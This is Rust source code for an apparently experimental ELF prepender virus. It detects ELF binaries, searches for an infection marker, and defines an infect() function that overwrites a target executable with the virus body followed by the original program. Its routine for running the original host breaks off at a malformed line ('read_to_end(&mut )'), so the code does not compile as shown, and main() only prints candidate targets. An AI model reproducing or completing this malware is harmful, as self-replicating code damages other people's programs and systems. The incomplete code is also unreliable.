use std::error::Error;
use std::ffi::{OsStr, OsString};
use std::fs::File;
use std::io::{Read, SeekFrom, Write};
use std::io::prelude::Seek;

use std::os::unix::fs::OpenOptionsExt;
use std::process::Command;
use std::{env, fs, process};

const ELF_MAGIC: [u8; 4] = [0x7f, 0x45, 0x4c, 0x46];
const INFECTION_MARK: [u8; 5] = [0x40, 0x54, 0x4d, 0x5a, 0x40];
const VIRUS_SIZE: u64 = 3000000;

fn get_file_size(path: &OsStr) -> Result<u64, Box<dyn Error>> {
    Ok(fs::metadata(&path)?.len())
}

fn is_elf(path: &OsStr) -> Result<bool, Box<dyn Error>> {
    let mut magic = [0; 4];
    File::open(path)?.read_exact(&mut magic)?;

    Ok(magic == ELF_MAGIC)
}

fn is_infected(path: &OsStr) -> Result<bool, Box<dyn Error>> {
    let file_size = get_file_size(path)? as usize;
    let buf = fs::read(path)?;

    for x in 1..file_size {
        if buf[x] == INFECTION_MARK[0] {
            for y in 1..INFECTION_MARK.len() {
                if (x + y) >= file_size {
                    break;
                }

                if buf[x + y] != INFECTION_MARK[y] {
                    break;
                }

                if y == INFECTION_MARK.len() - 1 {
                    return Ok(true);
                }
            }
        }
    }

    Ok(false)
}

fn infect(virus: &OsString, target: &OsStr) -> Result<(), Box<dyn Error>> {
    let host_buf = fs::read(target)?;
    let mut virus_buf = vec![0; VIRUS_SIZE as usize];
    File::open(virus)?.read_exact(&mut virus_buf)?;

    let mut infected = File::create(target)?;
    infected.write_all(&virus_buf)?;
    infected.write_all(&host_buf)?;

    Ok(())
}

fn run_infected_host(path: &OsString) -> Result<(), Box<dyn Error>> {
    let mut host_buf: Vec<u8> = Vec::new();
    let mut infected = File::open(path)?;

    let tmp_host_path = "/tmp/host";
    let mut plain_host_exe = fs::OpenOptions::new()
        .create(true)
        .write(true)
        .mode(0o755)
        .open(tmp_host_path)?;

    infected.seek(SeekFrom::Start(VIRUS_SIZE))?;
    infected.read_to_end(&mut )

    Ok(())
}

fn main() -> Result<(), Box<dyn Error>> {
    let myself = OsString::from(env::args().nth(0).unwrap());

    println!("Binary size: {}", get_file_size(&myself)?);

    let current_dir = env::current_dir()?;
    for entry in fs::read_dir(current_dir)? {
        let path = entry?.path();

        if fs::metadata(&path)?.is_file() {
            let entry_name = path.file_name().unwrap();
            if entry_name == OsString::from("infectme")
                && is_elf(entry_name)?
                && !is_infected(entry_name)?
            {
                println!("Will attempt to infect: {}", entry_name.to_str().unwrap());
            }
        }
    }

    Ok(())
}
